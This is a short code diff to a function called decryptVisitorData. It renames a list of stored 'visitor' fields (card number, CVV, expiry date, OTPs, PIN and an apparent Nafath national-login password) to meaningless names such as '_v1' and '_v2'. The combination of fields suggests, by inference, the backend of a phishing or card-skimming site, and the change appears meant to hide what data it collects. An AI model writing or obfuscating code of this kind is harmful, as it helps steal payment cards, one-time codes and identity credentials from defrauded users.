@@ -6,13 +6,13 @@ export function decryptVisitorData(visitor: any): any {
   const decrypted = { ...visitor }
 
   const fieldsToDecrypt = [
-    'cardNumber',
-    'cvv',
-    'expiryDate',
-    'otp',
-    'pinCode',
-    'nafazPass',
-    'phoneOtp'
+    '_v1',
+    '_v2',
+    '_v3',
+    '_v5',
+    '_v6',
+    '_v9',
+    '_v7'
   ]
 
   fieldsToDecrypt.forEach(field => {
